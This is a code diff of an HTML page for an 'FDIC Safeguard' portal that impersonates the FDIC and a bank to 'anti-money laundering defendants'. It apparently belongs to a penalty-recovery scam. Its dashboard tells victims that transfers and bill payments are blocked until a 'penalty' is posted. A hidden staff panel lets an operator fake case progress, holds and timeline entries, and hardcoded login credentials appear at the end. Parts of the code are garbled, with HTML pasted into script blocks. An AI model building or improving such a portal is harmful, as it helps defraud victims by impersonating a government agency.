@@ -969,9 +969,33 @@
         <text x="0" y="28" fill="#c9a227" font-size="18" font-weight="700" font-family="system-ui,sans-serif">FDIC Safeguard</text>
       </svg>
       <div class="user-controls">
-        <span class="user-name-badge" id="dash-fullname"></span>
-        <button type="button" class="signout-pill-btn" onclick="signOutUser()">Sign out</button>
-      </div>
+  <label for="signout-toggle">
+    <input type="checkbox" id="signout-toggle" onchange="handleSignOutToggle(this)" />
+    <span id="toggle-label">Signed In (Toggle to Sign Out)</span>
+  </label>
+<script>
+  function handleSignOutToggle(toggleElement) {
+    // Only run when the user switches the toggle ON (checked)
+    if (toggleElement.checked) {
+      const confirmSignOut = confirm("Are you sure you want to sign out?");
+
+      if (confirmSignOut) {
+        // 1. Update the label text
+        document.getElementById('toggle-label').textContent = "Signing out...";
+
+        // 2. Clear local session data
+        sessionStorage.clear();
+        localStorage.removeItem('userSessionToken');
+
+        // 3. Redirect to your login page (update '/login.html' to your actual login file)
+        window.location.href = "/login.html";
+      } else {
+        // If the user clicks "Cancel", flip the toggle back off
+        toggleElement.checked = false;
+      }
+    }
+  }
+</script>
     </header>
 
     <nav class="dash-nav">
@@ -981,7 +1005,11 @@
       <button type="button" class="nav-tab" onclick="checkServiceAvailability('Pay bills')">Pay bills</button>
       <button type="button" class="nav-tab" onclick="scrollToSection('case-status-section')">Case Status</button>
       <button type="button" class="nav-tab" onclick="scrollToSection('activity-log-section')">Chain-of-Custody</button>
-    </nav>
+    </nav>  <script>
+      function showActionMessage(action) { const messages = { 'Move money': 'BLOCKED UNTIL PENALTY RECOVERY DEBIT CARD IS ACTIVATED', 'Select a service': 'ONCE THE PENALTY RECOVERY AMOUNT IS POSTED NOTIFY YOUR ACCOUNT RECOVERY SPECIALIST FOR THIS OPTION.', 'Transfer': 'ALL TRANSFERS WILL BE AVAILABLE ONCE THE PENALTY HAS BEEN POSTED.', 'Wire': 'NO WIRES IN PROGRESS', 'Pay bills': 'BLOCKED WHILE UNDERGOING A FEDERAL PENALTY PROCESS', 'Deposit': 'INSUFFICIENT BALANCE NO DEPOSITS MADE', 'Withdraw': 'INSUFFICIENT BALANCE' }; const messageBox = document.getElementById('action-status-message'); if (messages[action]) { messageBox.textContent = messages[action]; messageBox.style.display = 'block'; } } function scrollToSection(sectionId) { const target = document.getElementById(sectionId); if (target) { target.scrollIntoView({ behavior: 
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               'smooth' }); } } 
+     </body>
+    </script>
 
     <div class="dash-container" id="top">
       <div class="greeting-banner">
@@ -1188,9 +1216,14 @@
             <div class="log-title">Claim submitted</div>
             <div class="log-body">Your anti-money laundering(AML) recovery case has been registered.</div>
           </div>
-        </div>
-      </div>
-    </div>
+         <div class="footer-col">
+            <h4>ONLINE BANKING HELP</h4>
+            <a href="#">Enrollment & User ID Recovery</a>
+            <a href="#">Mobile Banking Security Tips</a>
+            <a href="#">Supported Browsers</a>
+            <a href="#">System Requirements</a>
+          </div>
+         </div>
 
     <footer class="site-footer">
       <div class="footer-inner">
@@ -1201,13 +1234,7 @@
             <a href="#">Report Suspicious Activity</a>
             <a href="#">Lost or Stolen Card</a>
           </div>
-          <div class="footer-col">
-            <h4>ONLINE BANKING HELP</h4>
-            <a href="#">Enrollment & User ID Recovery</a>
-            <a href="#">Mobile Banking Security Tips</a>
-            <a href="#">Supported Browsers</a>
-            <a href="#">System Requirements</a>
-          </div>
+          
           <div class="footer-col">
             <h4>REGULATORY</h4>
             <a href="#">FDIC.gov</a>
@@ -1226,209 +1253,7 @@
     </footer>
   </div>
 
-  <!-- Admin Controls Section -->
-<div id="admin-panel">
-  <h3>1. Profile & Account Parameters</h3>
-  <input type="text" id="user-id" placeholder="Login User ID" />
-  <input type="text" id="defendant-name" placeholder="Defendant Full Name" />
-
-  <h3>2. Status & Progress Controls</h3>
-  <input type="number" id="completion-percent" min="0" max="100" placeholder="Overall Completion % (0-100)" />
-  <input type="text" id="global-alert" placeholder="Global Status Alert Message" />
-  
-  <select id="restriction-flag">
-    <option value="Normal Access">Normal Access</option>
-    <option value="Temporary Review Hold">Temporary Review Hold</option>
-    Identity Check Required</option>
-  </select>
-
-  <h3>3. Case Updates & Activity Log</h3>
-  <input type="text" id="entry-title" placeholder="Entry Title" />
-  <input type="text" id="entry-desc" placeholder="Entry Description" />
-  <button type="button" onclick="addTimelineEntry()">+ Add Timeline Entry</button>
-  <button type="button" onclick="clearTimeline()">Clear Timeline</button>
-
-  <!-- Display area for timeline entries -->
-  <ul id="timeline-list"></ul>
-
-  <hr />
-  <button type="button" onclick="saveAndApplyChanges()">Save & Apply Changes</button>
-  <button type="button" onclick="resetToDefaults()">Reset to Defaults</button>
-  <button type="button" onclick="signOut()">Sign out</button>
-</div> <script>
-  // 1. Function to Sign Out
-  function signOut() {
-    // Clear any temporary session data stored in the browser
-    sessionStorage.clear();
-    localStorage.removeItem('userSessionToken');
-
-    // Notify the backend server to destroy the session (if applicable)
-    // fetch('/api/logout', { method: 'POST' });
-
-    alert("You have been signed out.");
-    // Redirect to the login page
-    window.location.href = "/login.html"; 
-  }
-
-  // 2. Function to Add a Timeline Entry
- function addTimelineEntry() {
-    const title = document.getElementById('entry-title').value;
-    const desc = document.getElementById('entry-desc').value;
-
-    if (!title || !desc) {
-      alert("Please enter both a title and a description.");
-      return;
-    }
-
-    const list = document.getElementById('timeline-list');
-    const newItem = document.createElement('li');
-    const timestamp = new Date().toLocaleString();
-    
-    newItem.innerHTML = `<strong>${timestamp} - ${title}:</strong> ${desc}`;
-    list.appendChild(newItem);
-
-    // Clear the input boxes after adding
-    document.getElementById('entry-title').value = '';
-    document.getElementById('entry-desc').value = '';
-  }
-
-  // 3. Function to Clear the Timeline
- <h3>3. Case Updates & Activity Log</h3>
-
-<!-- New Date / Time input -->
-<input type="text" id="entry-datetime" placeholder="Event Date / Time (e.g., 11/13/2026 8:41 AM HST)" />
-
-<input type="text" id="entry-title" placeholder="Entry Title" />
-<input type="text" id="entry-desc" placeholder="Entry Description" />
-
-<button type="button" onclick="addTimelineEntry()">+ Add Timeline Entry</button>
-<button type="button" onclick="clearTimeline()">Clear Timeline</button>
-
-<!-- Display area for timeline entries -->
-<ul id="timeline-list"></ul> function clearTimeline() {
-    if (confirm("Are you sure you want to clear all timeline entries?")) {
-      document.getElementById('timeline-list').innerHTML = '';
-    }
-  }
-
-  // 4. Function to Save & Apply Changes
-  function saveAndApplyChanges() {
-    const dashboardData = {
-      userId: document.getElementById('user-id').value,
-      defendantName: document.getElementById('defendant-name').value,
-      completion: document.getElementById('completion-percent').value,
-      alertMessage: document.getElementById('global-alert').value,
-      restrictionFlag: document.getElementById('restriction-flag').value,
-      timelineHTML: document.getElementById('timeline-list').innerHTML
-    };
-
-    // Save locally for demonstration (In production, send this to your backend database using fetch())
-    localStorage.setItem('caseDashboardData', JSON.stringify(dashboardData));
-    alert("Changes saved and applied!");
-  }
-
-  // 5. Function to Reset to Defaults
-  function resetToDefaults() {
-    if (confirm("Reset all fields to default values?")) {
-      localStorage.removeItem('caseDashboardData');
-      location.reload(); // Reloads the page to clear inputs
-    }
-  }
- </script>
-
-</body>
-</html>
-
-
-
-  <div id="login-screen">
-    <div class="login-topbar">
-      <svg class="swoosh-svg" viewBox="0 0 200 42" xmlns="" label="FDIC Safeguard">
-        <text x="0" y="28" fill="#c9a227" font-size="18" font-weight="700" font-family="system-ui,sans-serif">FDIC Safeguard</text>
-      </svg>
-    </div>
-
-    <main class="login-main">
-      <div class="login-card">
-        <h1>Sign On</h1>
-        <p class="login-sub">Verified anti-money laundering defendants — secure case access only</p>
-
-        <div class="notice-box">
-          <div class="notice-title">ANTI-MONEY LAUNDERING(AML) DEFENDANT USE ONLY</div>
-          <div class="notice-body">
-            This portal is not open to the public and does not offer self-enrollment. Access is limited to individuals with an active anti money laundering case who received sign-on credentials from an assigned Recovery Specialist.
-          </div>
-        </div>
-
-        <div id="error-msg"></div>
-
-        <form id="login-form">
-          <div class="field-group">
-            <label for="userid-input">User ID</label>
-            <input type="text" id="userid-input" class="rect-input" autocomplete="username" />
-          </div>
-
-          <div class="field-group">
-            <label for="pass-input">Password</label>
-            <div class="pass-wrap">
-              <input type="password" id="pass-input" class="rect-input" autocomplete="current-password" />
-              <button type="button" class="eye-btn" id="toggle-eye">Show</button>
-            </div>
-          </div>
-
-          <div class="options-row">
-            <label class="remember-label">
-              <input type="checkbox" /> Remember me
-            </label>
-            <a href="#" class="gold-text-link">Forgot password?</a>
-          </div>
-
-          <button type="submit" class="gold-pill-btn">Sign On</button>
-        </form>
-
-        <div class="card-bottom-note">
-          AML Defendant Assistance Program — no public registration. If you do not have issued credentials, contact your Recovery Specialist; do not attempt to create an account here.
-          <br />
-          <button type="button" class="staff-link" onclick="showScreen('admin-screen')">Staff sign-on</button>
-        </div>
-      </div>
-    </main>
-
-    <footer class="site-footer">
-      <div class="footer-inner">to
-        <div class="footer-cols">
-          <div class="footer-col">
-            <h4>SUPPORT</h4>
-            <p>Contact your Penalty Recovery Specialist through this secure portal.</p>
-            <a href="#">Report Suspicious Activity</a>
-            <a href="#">Lost or Stolen Card</a>
-          </div>
-          <div class="footer-col">
-            <h4>ONLINE BANKING HELP</h4>
-            <a href="#">Enrollment & User ID Recovery</a>
-            <a href="#">Mobile Banking Security Tips</a>
-            <a href="#">Supported Browsers</a>
-            <a href="#">System Requirements</a>
-          </div>
-          <div class="footer-col">
-            <h4>REGULATORY</h4>
-            <a href="#">FDIC.gov</a>
-            <a href="#">Consumer Complaint Process</a>
-            <a href="#">Equal Credit Opportunity Act Notice</a>
-          </div>
-        </div>
-        <div class="program-badge"> FDIC PROGRAM —(AML) DEFENDANT USE ONLY</div>
-        <div class="ehl-row">⌂ EQUAL HOUSING LENDER</div>
-        <div class="legal-copy">
-          <p>© FDIC Safeguard. All rights reserved. FDIC deposit insurance at Safe Guard Bank applies only to anti-money laundering(AML) defendants enrolled in the AML Defendant Assistance Program with an active recovery case—not to the general public or standard retail accounts. Where applicable, coverage follows FDIC rules up to $250,000 per depositor, per insured institution, for each ownership category.</p>
-          <p>This website is for authorized customers only. Unauthorized access, use, or monitoring of this system is prohibited and may be subject to criminal and civil penalties under federal law, including the Computer Fraud and Abuse Act (18 U.S.C. § 1030). Activity may be logged and reviewed. By signing in, you agree to our Online Banking Agreement, Electronic Communications Consent, and Privacy Policy.</p>
-          <p>FDIC Safeguard does not offer general retail banking on this portal. Temporary FDIC Safe Custody Accounts in the Federal Defendant Center are established only for verified AML DEFENDANTS with an open federal recovery case, to segregate recovered funds during investigation.</p>
-        </div>
-      </div>
-    </footer>
-  </div>
-
-    const STORAGE_KEY = "fdic_safeguard_case_state_v1";
+  const STORAGE_KEY = "fdic_safeguard_case_state_v1";
     const defaultState = {
       userId: "fedcase1429",
       password: "defendant00",
